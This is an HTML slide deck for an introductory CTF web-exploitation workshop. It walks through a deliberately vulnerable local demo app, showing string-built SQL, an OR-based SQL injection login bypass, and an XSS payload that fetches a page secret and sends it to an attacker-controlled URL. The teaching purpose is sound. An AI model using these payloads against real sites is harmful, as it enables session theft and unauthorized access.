<!doctype html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<title>Web Introduction Workshop: CUHK CTF 2025</title>

		<link rel="stylesheet" href="dist/reset.css">
		<link rel="stylesheet" href="dist/reveal.css">
		<link rel="stylesheet" href="dist/theme/dracula.css">

		<!-- Theme used for syntax highlighted code -->
		<link rel="stylesheet" href="plugin/highlight/monokai.css">
		<style>
			.slides {
				font-size: .8em;
			}
			p {
				text-align: left;
			}
			.reveal ul {
				display: block;
			}
			.reveal ol {
				display: block;
			}
			.reveal .code-wrapper {
				width: 100%;
			}
		</style>
	</head>
	<body>
		<div class="reveal">
			<div class="slides">
				<section data-markdown>
					<textarea data-template>
						## CUHK CTF 2025: Introduction Workshop
						### `web` stands for Web Exploitation

						Note:
						Assumes some kind of programming background.
						---
						## `whoami`
						- [**FearlessSniper**](https://github.com/FearlessSniper) (a.k.a. `F21endSh1p` on CTFTime)
						- CUHK Computer Science (2023 - present)
						- Specialising in `pwn` (Binary Exploitation) and `web` (Web Exploitation)
						- Never have enough time to play CTFs
						---
						## What is web?
						- Web exploitation is the exploitation of web applications
						- Wikipedia: *A web application (or web app) is application software that is created with web technologies and runs via a web browser.*
						---
						## The *de-facto* web application architecture
						The simplest form of web application:
						[![Simple web application setup diagram](./webapp.png)](https://www.zealousys.com/wp-content/uploads/2024/01/Layers-of-Web-App-Architecture.webp)
						
						Note:
						This is the one of the simplest setup for a web application. As companies need to scale up their software, more individual components may appear.
						
						There is a client, server and a database. Each has its own possible bugs (i.e. attack surface), as we will see later.
						---
						### The *slightly more complex* web application architecture
						[![Simple web application setup diagram](./complex-webapp.png)](https://litslink.com/wp-content/uploads/2021/04/Web_Application_Architecture_Diagram__diagram_.png)
						---
						## HTTP: Hypertext Transfter Protocol
						- URL: A string indicating the thing that you want to look at
						- Request method: Hints the server of what you want to do in each request
						- **Stateless**: Server forgets who you are after each request. You should provide proof for your identity.
						---
						## Code of Ethics
						The exercises in this session should be attempted ONLY INSIDE THE SECLUDED LAB ENVIRONMENT documented or provided. Please note that most of the attacks described in the slides would be ILLEGAL if attempted on machines that you do not explicit permission to test and attack. You should bear responsibilities for any actions performed outside the secluded lab.
						---
						## Code of Ethics
						The challenge server should be regarded as a hostile environment. You should not use your real information when attempting challenges.
						---
						## Code of Ethics
						Do not intentionally disrupt other students who are working on the challenges or disclose private information you found on the challenge server (e.g. IP address of other students). Please let us know if you accidentally broke the challenge.
						---
						> Talk is cheap. Show me the code.

						Linus Torvalds
						---
						## Sample vulnerable web application
						Demonstration with [@chemistrying](https://github.com/chemistrying)'s sample vulnerable web application  
						Items/Skills/Vulnerabilities showcased:
						- Reading network traffic / HTML
						- SQL Injection
						- Common HTML endpoints
						- XSS (Cross Site Scripting)
						- Blind SQL Injection
						- RCE
						Note:
						I will not host the web application on the Internet this time, as the application will be defaced if everyone
						uses it at the same time.
						---
						## Run the vulnerable server locally
						1. Open terminal and clone the repository.
						```sh
						git clone https://github.com/chemistrying/cuhk-ctf-2024-web-demo
						```
						2. Change directory to `src`.
						```sh
						cd src
						```
						3. Install [Docker](https://docs.docker.com/get-started/get-docker/). 
						4. Run the server.
						```sh
						docker compose up -d
						```
						5. Web page is served on "http://localhost:23999".
						---
						# Walkthrough:
						# Exploiting the web app
						---
						## Onboarding: Poke around to see what it is doing
						- Bootstrap feel (although usually not important)
						- Login function --> Look for authentication bypasses
						- Forum feature --> Displays user input, might be vulnerable to XSS
						---
						## Poking around: Look at network traffic
						To understand what technology the web app uses, we should look at HTTP requests being made.  
						For example:
						- If the website is using WordPress, you might see requests to `/wp-content`, `/wp-includes`
						- There may be headers indicating the server software used
						---
						## Well known locations
						There are some well known locations for HTTP servers. They provide the same type of content by convention.
						- `robots.txt`: A text file used to tell *web crawlers* (programs that reads contents on web pages on the Internet)
						  which parts of the website is *preferred* to be crawled.
						---
						## Login code
						Performs a SQL query to the SQL database, and logins in as the first user that the query returns.
						```python []
						# Login logic
						db = get_db()
						with db.cursor() as conn:
							conn.execute(f"SELECT username, secret FROM users WHERE BINARY username = '{username}' AND BINARY password = '{password}'")
							result = conn.fetchall()
							if len(result) > 0 and (not result[0][0] == 'admin' or request.remote_addr == '127.0.0.1'): # Second part checks admin logic: only local can have access
								# Ok
								session['username'] = result[0][0]
								return redirect("/")
						```
						In other words, to login, we just have to make the SQL query return any user that is not *admin*!
						---
						## SQL Injection
						```sql [1|2|3-4|5]
						SELECT username, secret FROM users WHERE BINARY username = '{username}' AND BINARY password = '{password}'
						SELECT username, secret FROM users WHERE BINARY username = 'john' AND BINARY password = 'Password123'
						-- username: "john"; password: "' OR ''='"
						SELECT username, secret FROM users WHERE BINARY username = 'john' AND BINARY password = '' OR ''=''
						SELECT username, secret FROM users WHERE ((BINARY username = 'john' AND BINARY password = '') OR ''='')
						```
						We effectively disabled the `WHERE` clause and make the SQL server return all users.  
						Looking at code from the last slide, we know that we will be logged in as the first user.

						Note:
						- "Escaped" the original quotes
						- Operator precendence
						- Last condition always evaluates to true.
						---
						## Scripting in HTML
						To support interactive websites, HTML standard provides a way to load program code.  
						By using the `&lt;script&gt;` tag, webpages can include *Javascript* code that controls the webpage.
						---
						## Cross Site Scripting
						`&lt;script&gt;` tags can be used almost everywhere in the HTML document.
						When we wish to display user input, we might accidentally inject javascript code.
						```html [1|2-3]
						&lt;p&gt;John Smith&lt;/p&gt;
						&lt;!-- What if there is someone named &lt;script&gt;? Oops... --&gt;
						&lt;p&gt;&lt;script&gt;alert('You have been hacked!')&lt;/script&gt;&lt;/p&gt;
						```
						---
						## Cross Site Scripting
						This means that the attack can perform actions on behalf of the victim. Such as:
						- Stealing victim's login (session, not password)
						- Perform transactions on the same website
						- Annoy the victim with pop up messages
						---
						## Injectable HTML
						HTML template for `/forum` page:
						```jinja [1-15|7]
						{% for post in posts %}
						<div class="row row-cols-1 g-2 mt-2">
							<div class="col">
								<div class="card">
									<h5 class="card-header"> {{ post['title'] }} </h5>
									<div class="card-body">
										<p class="card-text"> {{ post['content'] | safe }} </p>
									</div>
									<div class="card-footer text-body-secondary">
										{{ post['date'] }} by {{ users[post['author_id']] if post['author_id'] in users.keys() else None
										}}
									</div>
								</div>
							</div>
						</div>
						```
						`| safe` indicates that the content won't be escaped, but the content has not been properly filtered before, vulnerable to XSS attacks.
						Note:
						Show it on the website first.
						---
						## Exploiting it
						We can tell the victim's computer to send its *cookies* to a URL that we control, stealing their login session.

						In this app, the flag for XSS attack is in the contents of the web page (the *secret* of admin). We write javascript code to send the
						web page to a URL that we control.
						```html
						&lt;script&gt;
						const f = async () =&gt; document.location.href = `our url here?{encodeURI(await (await fetch("http://localhost:8080/")).text())}`;
						f();
						&lt;/script&gt;
						```
						1. Fetch `/`, which has the secret we want
						2. Encode the content into the URL, and send it 
						---
						## Other vulnerabilities
						There is more to exploit with this app, but I will leave to you as an exercise due to time constraints :)
						- Two remaining flags
						Remaining Vulnerabilities:
						- Blind SQL injection --> Obtain Admin password (flag4)
						- RCE --> flag5 (Hint: `/code`)

						Check out the purposefully shitty webapp by [@chemistrying](https://github.com/chemistrying):
						https://github.com/chemistrying/cuhk-ctf-2024-web-demo
						---
						## Improving your `web` skills
						`web` is very flexible: it can be implemented using a lot of different software, each with its own quirks.  
						Almost every programming language have its own HTTP server implementation, meaning that you have to deal with vulnerabilities of every language.  
						Besides, software components are mixed and matched to fit requirements, which opens many doors to attacks.  
						**The only way is to look at more software, and you can do that by playing more CTFs!**
					</textarea>
				</section>
			</div>
		</div>

		<script src="dist/reveal.js"></script>
		<script src="plugin/notes/notes.js"></script>
		<script src="plugin/markdown/markdown.js"></script>
		<script src="plugin/highlight/highlight.js"></script>
		<script>
			// More info about initialization & config:
			// - https://revealjs.com/initialization/
			// - https://revealjs.com/config/
			Reveal.initialize({
				hash: true,
				slideNumber: true,
				// Learn about plugins: https://revealjs.com/plugins/
				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
			});
		</script>
	</body>
</html>
